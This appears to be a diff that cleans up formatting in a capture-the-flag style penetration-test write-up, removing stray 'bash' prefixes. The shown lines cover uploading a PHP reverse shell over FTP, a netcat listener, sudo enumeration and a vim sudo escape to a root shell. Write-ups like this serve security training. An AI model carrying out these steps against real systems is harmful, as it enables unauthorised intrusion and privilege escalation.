@@ -41,7 +41,7 @@ Upload the malicious PHP file via FTP:
 bashput shell.php
 Setting Up the Listener
 Before triggering the reverse shell, we set up a Netcat listener:
-bashnc -lvnp 4444
+nc -lvnp 4444
 ```
 
 ### Triggering the Shell
@@ -58,7 +58,7 @@ bashscript /dev/null -c bash
 This gives us a proper bash shell with better functionality.
 Privilege Enumeration
 We check for privilege escalation vectors by examining sudo permissions:
-bashsudo -l
+sudo -l
 ```
 
 **Critical Finding:**
@@ -67,14 +67,14 @@ bashsudo -l
 The vim binary can be executed with sudo privileges by the current user - this is a well-known privilege escalation vector.
 Exploiting Vim for Root Access
 We consult GTFOBins for the vim sudo exploitation technique:
-bashsudo vim -c ':!/bin/sh'
+sudo vim -c ':!/bin/sh'
 Alternative method:
-bashsudo vim
+sudo vim
 :set shell=/bin/sh
 :shell
 Verification
 Confirm root access:
-bashwhoami
+whoami
 Output: root
 
 Conclusion
